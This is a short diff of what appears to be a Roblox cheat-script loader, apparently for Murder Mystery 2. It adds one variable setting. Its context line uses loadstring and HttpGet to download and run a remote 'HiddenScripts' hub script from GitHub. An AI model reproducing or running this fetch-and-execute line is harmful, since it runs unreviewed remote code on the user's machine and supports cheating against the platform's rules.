@@ -7,6 +7,11 @@ OrionLib:MakeNotification({
 	Time = 30
 })
 
+
+
+getgenv().gui = false
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptingHubs/HiddenScripts/main/Mm2-HiddenScriptsHub"))()
 
 
